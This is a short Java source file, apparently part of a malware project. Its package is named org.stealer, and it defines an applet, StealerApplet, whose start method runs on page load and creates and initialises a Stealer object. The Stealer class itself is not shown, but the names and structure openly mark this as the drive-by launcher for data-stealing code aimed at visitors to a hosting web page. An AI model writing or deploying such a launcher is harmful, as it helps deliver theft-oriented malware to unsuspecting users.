package org.stealer;

import java.applet.Applet;

public class StealerApplet extends Applet {

	public void start() {
		Stealer stealer = new Stealer();
		stealer.init();
	}
}
